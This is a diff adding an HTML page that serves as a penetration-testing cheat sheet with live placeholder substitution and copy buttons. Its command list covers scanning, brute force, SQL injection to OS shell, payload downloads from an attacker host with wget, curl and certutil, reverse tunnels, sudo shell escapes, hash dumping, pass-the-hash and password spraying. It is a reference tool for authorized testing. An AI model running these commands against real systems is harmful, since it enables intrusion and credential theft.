@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MOTHER — COMMAND DECK</title>
+<link rel="stylesheet" href="mother.css">
+<style>
+  /* ═══════════════════════════════════════════════════════════════
+     COMMAND DECK — SYS.03. Categorized pentest command cheatsheet
+     with live placeholder substitution. Fill TARGET/LHOST/LPORT/URL/
+     WORDLIST once → every command re-renders with your values.
+     Module-specific CSS only; theme lives in mother.css.
+     ═══════════════════════════════════════════════════════════════ */
+  .ctrlbar {
+    display:flex; align-items:flex-end; gap:12px; flex-wrap:wrap;
+    padding:8px 14px; border-bottom:1px solid var(--border);
+    background:linear-gradient(180deg,rgba(51,255,51,0.04),transparent);
+  }
+  .ctrlbar .field { flex:0 0 auto; }
+  .ctrlbar .field.grow { flex:1 1 200px; }
+  .ctrlbar input { width:100%; }
+  .ctrlbar .ph-target  { min-width:130px; }
+  .ctrlbar .ph-lhost   { min-width:120px; }
+  .ctrlbar .ph-lport   { min-width:74px; }
+  .ctrlbar .ph-url     { min-width:170px; }
+  .ctrlbar .ph-wl      { min-width:230px; }
+  .ctrlbar .search-wrap { flex:1 1 240px; }
+  .ctrlbar .reset { align-self:flex-end; }
+
+  .split { display:grid; grid-template-columns:210px 1fr; min-height:0; height:100%; }
+
+  .cats { display:flex; flex-direction:column; padding:6px 0; }
+
+  .main-head {
+    display:flex; align-items:center; justify-content:space-between; gap:10px;
+    padding:10px 16px; border-bottom:1px solid var(--border-dim);
+    position:sticky; top:0; background:var(--bg-deep); z-index:5;
+  }
+  .main-head .h-title { font-size:11px; letter-spacing:0.2em; color:var(--phos-br); text-shadow:var(--glow); }
+  .main-head .h-sub { font-size:9px; letter-spacing:0.14em; color:var(--phos-dim); }
+  .cards-wrap { padding:12px 16px 40px; }
+
+  .card { display:grid; gap:8px; }
+  .cmd-top { display:flex; align-items:center; justify-content:space-between; gap:10px; }
+  .cmd-cat { font-size:8px; letter-spacing:0.2em; color:var(--phos-dim); text-transform:uppercase; }
+  .code { line-height:1.5; }
+  .subbed {
+    color:var(--holo); background:rgba(0,200,255,0.10);
+    padding:0 3px; border-radius:1px; text-shadow:0 0 5px rgba(0,200,255,0.5);
+  }
+  .tok { color:var(--amber); opacity:0.9; }
+  .cmd-desc { font-size:10px; color:var(--phos-dim); letter-spacing:0.03em; line-height:1.45; }
+  .cmd-tags { display:flex; flex-wrap:wrap; gap:0; }
+  .copy-fb { color:var(--ok) !important; border-color:var(--ok) !important; }
+  mark.hl { background:rgba(232,166,58,0.25); color:var(--phos-br); }
+</style>
+</head>
+<body>
+  <header class="m-header">
+    <div class="m-brand">COMMAND DECK<small>MOTHER · SYS.03 · PENTEST CHEATSHEET</small></div>
+    <div class="m-stats">
+      <div class="m-stat">Commands<b id="s-cmds">0</b></div>
+      <div class="m-stat">Categories<b id="s-cats">0</b></div>
+      <div class="m-stat">Placeholders<b id="s-ph">0/5</b></div>
+    </div>
+    <div class="m-haz"></div>
+    <div class="m-stat" style="text-align:right">Active Target<b id="s-target" class="holo">—</b></div>
+  </header>
+
+  <div class="m-body" style="grid-template-rows:auto 1fr; display:grid;">
+    <!-- placeholder control bar -->
+    <div class="ctrlbar">
+      <div class="field ph-target"><label>Target</label><input id="p-TARGET" placeholder="10.10.10.15" autocomplete="off" spellcheck="false"></div>
+      <div class="field ph-lhost"><label>LHost</label><input id="p-LHOST" placeholder="10.10.14.7" autocomplete="off" spellcheck="false"></div>
+      <div class="field ph-lport"><label>LPort</label><input id="p-LPORT" placeholder="4444" autocomplete="off" spellcheck="false"></div>
+      <div class="field ph-url"><label>Url</label><input id="p-URL" placeholder="http://10.10.10.15" autocomplete="off" spellcheck="false"></div>
+      <div class="field ph-wl"><label>Wordlist</label><input id="p-WORDLIST" placeholder="/usr/share/wordlists/..." autocomplete="off" spellcheck="false"></div>
+      <div class="field search-wrap"><label>◤ Search Commands ◥</label><input id="q" placeholder="filter: cmd / desc / tag …" autocomplete="off" spellcheck="false"></div>
+      <button class="btn btn--ghost reset" id="btn-reset">RESET</button>
+    </div>
+
+    <div class="split">
+      <nav class="pane pane--nav">
+        <div class="cats navlist" id="cats"></div>
+      </nav>
+      <section class="pane">
+        <div class="main-head">
+          <div class="h-title" id="h-title">ALL COMMANDS</div>
+          <div class="h-sub" id="h-sub">0 shown</div>
+        </div>
+        <div class="cards-wrap" id="cards"></div>
+      </section>
+    </div>
+  </div>
+
+  <script>
+  'use strict';
+  const $ = id => document.getElementById(id);
+  const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  const KEY = 'mother.cmddeck.v1';
+  const FIELDS = ['TARGET','LHOST','LPORT','URL','WORDLIST'];
+  const TOKRE = /<(TARGET|LHOST|LPORT|URL|WORDLIST)>/g;
+
+  /* ── Command library ─────────────────────────────────────────────
+     Stored as [category, command(template), description, [tags]].
+     Command strings use backtick literals so single/double quotes need
+     no escaping; backslashes are doubled so \\; → \; at runtime.       */
+  const CMDS = [
+    /* ───────────── RECON ───────────── */
+    ['RECON', `nmap -sn <TARGET>/24`, 'Ping sweep — discover live hosts on the /24, no port scan', ['nmap','discovery','icmp']],
+    ['RECON', `nmap -p- --min-rate 5000 -T4 -oA scans/allports <TARGET>`, 'Full 65535 TCP port scan, fast, all output formats', ['nmap','tcp','full']],
+    ['RECON', `nmap -sC -sV -p 22,80,443 -oA scans/svc <TARGET>`, 'Default NSE scripts + service/version detection on known-open ports', ['nmap','version','nse']],
+    ['RECON', `nmap -sU --top-ports 50 -T4 <TARGET>`, 'Scan the top 50 UDP ports (snmp/dns/tftp/etc.)', ['nmap','udp']],
+    ['RECON', `nmap -sV --script vuln <TARGET>`, 'Run the NSE vuln category against detected services', ['nmap','vuln','nse']],
+    ['RECON', `nmap -O -sV --osscan-guess <TARGET>`, 'OS fingerprint + version detection with aggressive guessing', ['nmap','os']],
+    ['RECON', `masscan -p1-65535,U:1-65535 <TARGET>/24 --rate 1000 -oL masscan.txt`, 'Internet-scale TCP+UDP sweep across the subnet', ['masscan','fast']],
+    ['RECON', `rustscan -a <TARGET> --ulimit 5000 -- -sC -sV`, 'Rustscan finds open ports fast, then hands off to nmap', ['rustscan','nmap']],
+    ['RECON', `dig axfr @<TARGET> example.com`, 'Attempt a DNS zone transfer against the target nameserver', ['dns','axfr','zone-transfer']],
+    ['RECON', `dnsrecon -d example.com -n <TARGET> -t axfr`, 'DNS recon incl. zone transfer against a specific server', ['dns','dnsrecon']],
+    ['RECON', `fping -a -g <TARGET>/24 2>/dev/null`, 'Fast ICMP sweep, print only alive hosts', ['fping','discovery']],
+    ['RECON', `arp-scan --localnet --interface tun0`, 'Layer-2 ARP host discovery on the local segment', ['arp','l2']],
+
+    /* ───────────── ENUMERATION ───────────── */
+    ['ENUMERATION', `enum4linux -a <TARGET>`, 'All-in-one SMB/NetBIOS enumeration (users, shares, groups, policy)', ['smb','netbios']],
+    ['ENUMERATION', `enum4linux-ng -A <TARGET>`, 'Modern rewrite of enum4linux with cleaner output', ['smb','enum']],
+    ['ENUMERATION', `smbmap -H <TARGET>`, 'List SMB shares and your access level on each', ['smb','shares']],
+    ['ENUMERATION', `smbmap -H <TARGET> -u guest -p ''`, 'SMB share enumeration as the guest / null-ish account', ['smb','guest']],
+    ['ENUMERATION', `smbclient -L //<TARGET>/ -N`, 'List shares over SMB with a null session (no creds)', ['smb','null-session']],
+    ['ENUMERATION', `smbclient //<TARGET>/share -N`, 'Interactively connect to a share with no password', ['smb','client']],
+    ['ENUMERATION', `crackmapexec smb <TARGET> --shares -u '' -p ''`, 'CME null-session share listing and host info', ['cme','smb','null']],
+    ['ENUMERATION', `crackmapexec smb <TARGET>/24`, 'Sweep a subnet for SMB signing, OS, domain and hostname', ['cme','sweep']],
+    ['ENUMERATION', `rpcclient -U "" -N <TARGET>`, 'Null RPC session — then run enumdomusers / querydispinfo', ['rpc','null-session']],
+    ['ENUMERATION', `ldapsearch -x -H ldap://<TARGET> -s base namingcontexts`, 'Anonymous LDAP — read the naming contexts / base DN', ['ldap','anon']],
+    ['ENUMERATION', `ldapsearch -x -H ldap://<TARGET> -b "dc=example,dc=com" "(objectClass=user)"`, 'Dump user objects from the directory over LDAP', ['ldap','users']],
+    ['ENUMERATION', `snmpwalk -v2c -c public <TARGET>`, 'Walk the full SNMP tree with the default community string', ['snmp','public']],
+    ['ENUMERATION', `snmp-check <TARGET> -c public`, 'Human-readable SNMP enumeration (processes, users, net)', ['snmp','enum']],
+    ['ENUMERATION', `onesixtyone -c community.txt <TARGET>`, 'Brute-force SNMP community strings from a list', ['snmp','brute']],
+    ['ENUMERATION', `showmount -e <TARGET>`, 'List NFS exports offered by the host', ['nfs','exports']],
+    ['ENUMERATION', `nbtscan -r <TARGET>/24`, 'NetBIOS name scan across the subnet', ['netbios','scan']],
+
+    /* ───────────── WEB ───────────── */
+    ['WEB', `gobuster dir -u <URL> -w <WORDLIST> -t 50 -x php,html,txt`, 'Directory/file brute force with common extensions', ['gobuster','dir','fuzz']],
+    ['WEB', `gobuster dir -u <URL> -w <WORDLIST> -b 403,404 -t 50`, 'Content discovery, blacklisting 403/404 status codes', ['gobuster','dir']],
+    ['WEB', `gobuster vhost -u <URL> -w <WORDLIST> --append-domain`, 'Virtual-host discovery via the Host header', ['gobuster','vhost']],
+    ['WEB', `gobuster dns -d example.com -w <WORDLIST> -t 50`, 'Subdomain brute force over DNS', ['gobuster','dns','subdomain']],
+    ['WEB', `ffuf -u <URL>/FUZZ -w <WORDLIST> -mc 200,301,302,401`, 'ffuf directory fuzz, match interesting status codes', ['ffuf','dir']],
+    ['WEB', `ffuf -u <URL>/FUZZ -w <WORDLIST> -e .php,.txt,.bak -fc 404`, 'ffuf with extensions, filter out 404s', ['ffuf','ext']],
+    ['WEB', `ffuf -u <URL>/ -H "Host: FUZZ.example.com" -w <WORDLIST> -fs 4242`, 'vhost fuzz via Host header, filter by baseline response size', ['ffuf','vhost']],
+    ['WEB', `ffuf -u '<URL>/?FUZZ=test' -w <WORDLIST> -fs 0`, 'Parameter-name fuzzing on the query string', ['ffuf','param']],
+    ['WEB', `feroxbuster -u <URL> -w <WORDLIST> -x php,txt -t 50`, 'Recursive content discovery with feroxbuster', ['feroxbuster','recursive']],
+    ['WEB', `whatweb -a 3 <URL>`, 'Aggressive fingerprint of web technologies / CMS / versions', ['whatweb','fingerprint']],
+    ['WEB', `nikto -h <URL> -Tuning 123bde`, 'Web server misconfig / known-vuln scan, tuned', ['nikto','vuln']],
+    ['WEB', `wpscan --url <URL> --enumerate u,vp,vt --api-token YOUR_TOKEN`, 'WordPress users + vulnerable plugins/themes enumeration', ['wpscan','wordpress']],
+    ['WEB', `wpscan --url <URL> -U admin -P <WORDLIST>`, 'WordPress wp-login password brute force', ['wpscan','brute']],
+    ['WEB', `wfuzz -c -z file,<WORDLIST> --hc 404 <URL>/FUZZ`, 'wfuzz content discovery, hide 404s', ['wfuzz','dir']],
+    ['WEB', `curl -sk -X OPTIONS <URL> -i`, 'List allowed HTTP methods (PUT/DELETE/TRACE?)', ['curl','options']],
+    ['WEB', `curl -sk <URL>/robots.txt`, 'Grab robots.txt for disallowed / hidden paths', ['curl','robots']],
+    ['WEB', `dirb <URL> <WORDLIST> -r`, 'Classic dirb non-recursive content scan', ['dirb','dir']],
+
+    /* ───────────── EXPLOITATION ───────────── */
+    ['EXPLOITATION', `searchsploit apache 2.4.49`, 'Search the local Exploit-DB mirror by product + version', ['searchsploit','exploit-db']],
+    ['EXPLOITATION', `searchsploit -m 50383`, 'Mirror (copy) an exploit into the current directory by EDB-ID', ['searchsploit','mirror']],
+    ['EXPLOITATION', `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run"`, 'Launch Metasploit straight into a listener', ['metasploit','handler']],
+    ['EXPLOITATION', `sqlmap -u "<URL>/?id=1" --batch --dbs`, 'Automated SQLi — enumerate databases, no prompts', ['sqlmap','sqli']],
+    ['EXPLOITATION', `sqlmap -u "<URL>/?id=1" --batch -D appdb -T users --dump`, 'Dump a table once the DB/table are known', ['sqlmap','dump']],
+    ['EXPLOITATION', `sqlmap -r request.txt --batch --level 5 --risk 3`, 'Feed a saved Burp request, crank depth/risk', ['sqlmap','request']],
+    ['EXPLOITATION', `sqlmap -u "<URL>/?id=1" --batch --os-shell`, 'Attempt an interactive OS shell via SQL injection', ['sqlmap','os-shell']],
+    ['EXPLOITATION', `hydra -L users.txt -P <WORDLIST> ssh://<TARGET>`, 'SSH credential brute force with user + password lists', ['hydra','ssh','brute']],
+    ['EXPLOITATION', `hydra -l admin -P <WORDLIST> <TARGET> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"`, 'HTTP POST login brute force, fail-string based', ['hydra','http','brute']],
+    ['EXPLOITATION', `hydra -l admin -P <WORDLIST> ftp://<TARGET>`, 'FTP password brute force for a known user', ['hydra','ftp']],
+    ['EXPLOITATION', `medusa -h <TARGET> -u admin -P <WORDLIST> -M ssh`, 'Medusa — alternative parallel login brute forcer', ['medusa','brute']],
+    ['EXPLOITATION', `nc -nv <TARGET> <LPORT>`, 'Raw connect / banner grab against a service port', ['netcat','banner']],
+
+    /* ───────────── POST-EXPLOIT ───────────── */
+    ['POST-EXPLOIT', `python3 -c 'import pty; pty.spawn("/bin/bash")'`, 'Spawn a pseudo-terminal from a dumb shell', ['tty','shell']],
+    ['POST-EXPLOIT', `script -qc /bin/bash /dev/null`, 'Alternative interactive PTY when python is absent', ['tty','script']],
+    ['POST-EXPLOIT', `python3 -m http.server <LPORT>`, 'Host files from the attack box to transfer to the target', ['transfer','http']],
+    ['POST-EXPLOIT', `wget http://<LHOST>:<LPORT>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh`, 'Pull an enumeration script onto a Linux target', ['transfer','wget']],
+    ['POST-EXPLOIT', `curl http://<LHOST>:<LPORT>/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy`, 'Download pspy to watch processes/cron without root', ['transfer','curl','pspy']],
+    ['POST-EXPLOIT', `certutil -urlcache -f http://<LHOST>:<LPORT>/nc.exe C:\\Windows\\Temp\\nc.exe`, 'Living-off-the-land file download on Windows', ['transfer','windows','certutil']],
+    ['POST-EXPLOIT', `impacket-psexec 'administrator@<TARGET>'`, 'SYSTEM shell via SMB (creates a service) — Impacket psexec', ['impacket','smb','lateral']],
+    ['POST-EXPLOIT', `impacket-wmiexec 'DOMAIN/user:Passw0rd@<TARGET>'`, 'Semi-interactive shell over WMI (quieter than psexec)', ['impacket','wmi','lateral']],
+    ['POST-EXPLOIT', `impacket-secretsdump 'DOMAIN/user:Passw0rd@<TARGET>'`, 'Dump SAM/LSA secrets and domain hashes remotely', ['impacket','hashes','dump']],
+    ['POST-EXPLOIT', `evil-winrm -i <TARGET> -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe`, 'Pass-the-hash into a WinRM session', ['winrm','pth']],
+    ['POST-EXPLOIT', `evil-winrm -i <TARGET> -u user -p 'Passw0rd'`, 'Interactive WinRM shell with plaintext creds', ['winrm','shell']],
+    ['POST-EXPLOIT', `crackmapexec smb <TARGET> -u user -p 'Passw0rd' -x whoami`, 'Run a command across hosts over SMB with CME', ['cme','exec']],
+    ['POST-EXPLOIT', `impacket-smbserver share . -smb2support`, 'Stand up an SMB share on the attack box for file transfer', ['impacket','smb','transfer']],
+
+    /* ───────────── PRIVESC ───────────── */
+    ['PRIVESC', `sudo -l`, 'List what the current user may run via sudo — start here', ['sudo','linux']],
+    ['PRIVESC', `find / -perm -4000 -type f 2>/dev/null`, 'Enumerate SUID binaries (potential GTFOBins abuse)', ['suid','linux']],
+    ['PRIVESC', `find / -perm -2000 -type f 2>/dev/null`, 'Enumerate SGID binaries', ['sgid','linux']],
+    ['PRIVESC', `getcap -r / 2>/dev/null`, 'Find file capabilities (e.g. cap_setuid on python/perl)', ['capabilities','linux']],
+    ['PRIVESC', `sudo find . -exec /bin/sh \\; -quit`, 'GTFOBins: escalate via sudo-allowed find', ['gtfobins','sudo','find']],
+    ['PRIVESC', `sudo awk 'BEGIN {system("/bin/sh")}'`, 'GTFOBins: shell out through sudo-allowed awk', ['gtfobins','sudo','awk']],
+    ['PRIVESC', `sudo vim -c ':!/bin/sh'`, 'GTFOBins: drop to a shell from sudo-allowed vim', ['gtfobins','sudo','vim']],
+    ['PRIVESC', `./linpeas.sh -a 2>/dev/null | tee linpeas.txt`, 'Full automated Linux privesc enumeration', ['linpeas','enum']],
+    ['PRIVESC', `cat /etc/crontab; ls -la /etc/cron.*`, 'Inspect scheduled jobs for writable / abusable scripts', ['cron','linux']],
+    ['PRIVESC', `grep -rniE "password|passwd|secret|api_key" /var/www 2>/dev/null`, 'Hunt for hard-coded credentials in web roots', ['creds','grep']],
+    ['PRIVESC', `uname -a; cat /etc/os-release`, 'Kernel + distro info to feed a kernel-exploit suggester', ['kernel','linux']],
+    ['PRIVESC', `.\\winPEASx64.exe quiet`, 'Automated Windows privesc enumeration', ['winpeas','windows']],
+    ['PRIVESC', `whoami /priv`, 'List token privileges (SeImpersonate → Potato attacks)', ['windows','privileges']],
+    ['PRIVESC', `systeminfo`, 'Windows patch level / hotfixes — feed to WES-NG', ['windows','systeminfo']],
+
+    /* ───────────── PIVOTING ───────────── */
+    ['PIVOTING', `ssh -L 8080:127.0.0.1:80 user@<TARGET>`, 'Local port forward — reach a service bound to loopback', ['ssh','local-forward']],
+    ['PIVOTING', `ssh -R 8080:127.0.0.1:80 user@<LHOST>`, 'Remote port forward — expose a target service back to you', ['ssh','remote-forward']],
+    ['PIVOTING', `ssh -D 1080 user@<TARGET>`, 'Dynamic SOCKS proxy through the target (use with proxychains)', ['ssh','socks']],
+    ['PIVOTING', `chisel server -p <LPORT> --reverse`, 'Attack box: run the chisel server for a reverse tunnel', ['chisel','server']],
+    ['PIVOTING', `chisel client <LHOST>:<LPORT> R:socks`, 'Victim: reverse SOCKS proxy back to the attacker', ['chisel','socks']],
+    ['PIVOTING', `chisel client <LHOST>:<LPORT> R:8080:127.0.0.1:80`, 'Victim: reverse-forward a single internal service', ['chisel','forward']],
+    ['PIVOTING', `sshuttle -r user@<TARGET> 10.10.10.0/24`, 'Transparent VPN-like routing through an SSH host', ['sshuttle','vpn']],
+    ['PIVOTING', `proxychains -q nmap -sT -Pn <TARGET>`, 'Scan through a SOCKS proxy (TCP connect only)', ['proxychains','nmap']],
+    ['PIVOTING', `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<TARGET>:80`, 'Simple port relay / redirector via socat', ['socat','relay']],
+
+    /* ───────────── PASSWORD ATTACKS ───────────── */
+    ['PASSWORD ATTACKS', `hashcat -m 0 hash.txt <WORDLIST> -O`, 'Crack raw MD5 hashes (mode 0)', ['hashcat','md5']],
+    ['PASSWORD ATTACKS', `hashcat -m 1000 hash.txt <WORDLIST>`, 'Crack NTLM hashes (mode 1000)', ['hashcat','ntlm']],
+    ['PASSWORD ATTACKS', `hashcat -m 1800 hash.txt <WORDLIST>`, 'Crack Linux sha512crypt $6$ hashes (mode 1800)', ['hashcat','linux']],
+    ['PASSWORD ATTACKS', `hashcat -m 13100 tgs.txt <WORDLIST>`, 'Crack Kerberoast TGS-REP tickets (mode 13100)', ['hashcat','kerberoast']],
+    ['PASSWORD ATTACKS', `hashcat -m 18200 asrep.txt <WORDLIST>`, 'Crack AS-REP roasted hashes (mode 18200)', ['hashcat','asrep']],
+    ['PASSWORD ATTACKS', `hashcat -m 22000 wpa.hc22000 <WORDLIST>`, 'Crack WPA-PMKID/EAPOL captures (mode 22000)', ['hashcat','wpa']],
+    ['PASSWORD ATTACKS', `john --wordlist=<WORDLIST> hash.txt`, 'John the Ripper straight dictionary attack', ['john','wordlist']],
+    ['PASSWORD ATTACKS', `john --format=NT --wordlist=<WORDLIST> hash.txt`, 'John cracking NT hashes explicitly', ['john','nt']],
+    ['PASSWORD ATTACKS', `unshadow /etc/passwd /etc/shadow > unshadowed.txt`, 'Combine passwd+shadow before cracking with john', ['john','unshadow']],
+    ['PASSWORD ATTACKS', `ssh2john id_rsa > id_rsa.hash && john --wordlist=<WORDLIST> id_rsa.hash`, 'Crack an encrypted SSH private key passphrase', ['john','ssh-key']],
+    ['PASSWORD ATTACKS', `impacket-GetNPUsers 'example.com/' -usersfile users.txt -no-pass -dc-ip <TARGET>`, 'AS-REP roasting — grab hashes for pre-auth-disabled users', ['impacket','asrep','kerberos']],
+    ['PASSWORD ATTACKS', `impacket-GetUserSPNs 'example.com/user:Passw0rd' -dc-ip <TARGET> -request`, 'Kerberoasting — request TGS tickets for SPN accounts', ['impacket','kerberoast']],
+    ['PASSWORD ATTACKS', `crackmapexec smb <TARGET> -u users.txt -p 'Spring2025!' --continue-on-success`, 'Password spray a single password across many users', ['cme','spray']],
+    ['PASSWORD ATTACKS', `kerbrute passwordspray -d example.com --dc <TARGET> users.txt 'Spring2025!'`, 'Fast Kerberos-based password spraying', ['kerbrute','spray']],
+  ];
+
+  const CATS = ['RECON','ENUMERATION','WEB','EXPLOITATION','POST-EXPLOIT','PRIVESC','PIVOTING','PASSWORD ATTACKS'];
+
+  /* ── State + persistence ─────────────────────────────────────── */
+  const DEFAULTS = { TARGET:'10.10.10.15', LHOST:'10.10.14.7', LPORT:'4444',
+    URL:'http://10.10.10.15', WORDLIST:'/usr/share/wordlists/dirb/common.txt' };
+  let vals = load();
+  let curCat = 'ALL';
+  let query = '';
+
+  function load() {
+    try { const s = JSON.parse(localStorage.getItem(KEY)); if (s && typeof s === 'object') return { ...DEFAULTS, ...s }; }
+    catch (e) {}
+    return { ...DEFAULTS };
+  }
+  function save() { try { localStorage.setItem(KEY, JSON.stringify(vals)); } catch (e) {} }
+
+  /* ── Rendering ───────────────────────────────────────────────── */
+  function renderCmd(cmd) {
+    let out = '', last = 0, m; TOKRE.lastIndex = 0;
+    while ((m = TOKRE.exec(cmd))) {
+      out += esc(cmd.slice(last, m.index));
+      const v = vals[m[1]];
+      out += v ? `<span class="subbed">${esc(v)}</span>` : `<span class="tok">&lt;${m[1]}&gt;</span>`;
+      last = TOKRE.lastIndex;
+    }
+    out += esc(cmd.slice(last));
+    return out;
+  }
+  function subst(cmd) { return cmd.replace(TOKRE, (_, k) => vals[k] || '<' + k + '>'); }
+
+  function hlQuery(html, q) {
+    if (!q) return html;
+    // highlight only in already-escaped text nodes (avoid breaking tags/spans)
+    return html.replace(/>([^<]+)</g, (mm, text) => {
+      const re = new RegExp('(' + q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi');
+      return '>' + text.replace(re, '<mark class="hl">$1</mark>') + '<';
+    });
+  }
+
+  function matches(row, q) {
+    if (!q) return true;
+    return (row[1] + ' ' + row[2] + ' ' + row[3].join(' ')).toLowerCase().includes(q);
+  }
+
+  function renderCats() {
+    const q = query.toLowerCase();
+    const el = $('cats');
+    const count = c => CMDS.filter(r => (c === 'ALL' || r[0] === c) && matches(r, q)).length;
+    let html = navItem('ALL', 'ALL COMMANDS', count('ALL'));
+    CATS.forEach(c => { html += navItem(c, c, count(c)); });
+    el.innerHTML = html;
+    el.querySelectorAll('.navitem').forEach(b =>
+      b.addEventListener('click', () => { curCat = b.dataset.cat; renderCats(); renderCards(); }));
+  }
+  function navItem(cat, label, n) {
+    const active = cat === curCat ? ' navitem--active' : '';
+    return `<button class="navitem${active}" data-cat="${esc(cat)}">${esc(label)}<span class="count">${n}</span></button>`;
+  }
+
+  function renderCards() {
+    const q = query.toLowerCase();
+    const rows = CMDS.map((r, i) => [r, i]).filter(([r]) => (curCat === 'ALL' || r[0] === curCat) && matches(r, q));
+    $('h-title').textContent = curCat === 'ALL' ? 'ALL COMMANDS' : curCat;
+    $('h-sub').textContent = rows.length + (rows.length === 1 ? ' shown' : ' shown');
+    const wrap = $('cards');
+    if (!rows.length) {
+      wrap.innerHTML = `<div class="empty"><div class="icon">▯</div><div class="big">NO MATCH</div><div class="dim">no commands match "${esc(query)}"</div></div>`;
+      return;
+    }
+    wrap.innerHTML = rows.map(([r, i]) => {
+      const tags = r[3].map(t => `<span class="tag">${esc(t)}</span>`).join('');
+      const code = hlQuery(renderCmd(r[1]), query);
+      return `<div class="card brackets">
+        <div class="cmd-top">
+          <span class="cmd-cat">${esc(r[0])}</span>
+          <button class="copy-btn" data-i="${i}">⧉ COPY</button>
+        </div>
+        <div class="code">${code}</div>
+        <div class="cmd-desc">${hlQuery(esc(r[2]), query)}</div>
+        <div class="cmd-tags">${tags}</div>
+      </div>`;
+    }).join('');
+  }
+
+  function updateStats() {
+    $('s-cmds').textContent = CMDS.length;
+    $('s-cats').textContent = CATS.length;
+    const filled = FIELDS.filter(f => (vals[f] || '').trim()).length;
+    $('s-ph').textContent = filled + '/5';
+    $('s-target').textContent = (vals.TARGET || '').trim() || '—';
+  }
+
+  /* ── Copy handling (delegated) ───────────────────────────────── */
+  function copyText(text) {
+    if (navigator.clipboard && navigator.clipboard.writeText) return navigator.clipboard.writeText(text);
+    return new Promise(res => {
+      const ta = document.createElement('textarea');
+      ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+      document.body.appendChild(ta); ta.select();
+      try { document.execCommand('copy'); } catch (e) {}
+      document.body.removeChild(ta); res();
+    });
+  }
+  $('cards').addEventListener('click', e => {
+    const btn = e.target.closest('.copy-btn'); if (!btn) return;
+    const row = CMDS[+btn.dataset.i]; if (!row) return;
+    copyText(subst(row[1])).then(() => {
+      const card = btn.closest('.card'); const code = card && card.querySelector('.code');
+      if (code) { code.classList.remove('flash'); void code.offsetWidth; code.classList.add('flash'); }
+      const prev = btn.textContent; btn.textContent = '✔ COPIED'; btn.classList.add('copy-fb');
+      setTimeout(() => { btn.textContent = prev; btn.classList.remove('copy-fb'); }, 900);
+    });
+  });
+
+  /* ── Inputs ──────────────────────────────────────────────────── */
+  FIELDS.forEach(f => {
+    const el = $('p-' + f);
+    el.value = vals[f] || '';
+    el.addEventListener('input', () => { vals[f] = el.value; save(); updateStats(); renderCards(); });
+  });
+  $('q').addEventListener('input', () => { query = $('q').value.trim(); renderCats(); renderCards(); });
+  $('btn-reset').addEventListener('click', () => {
+    vals = { ...DEFAULTS }; save();
+    FIELDS.forEach(f => { $('p-' + f).value = vals[f]; });
+    updateStats(); renderCards();
+  });
+
+  /* ── Boot ────────────────────────────────────────────────────── */
+  updateStats(); renderCats(); renderCards();
+  </script>
+</body>
+</html>
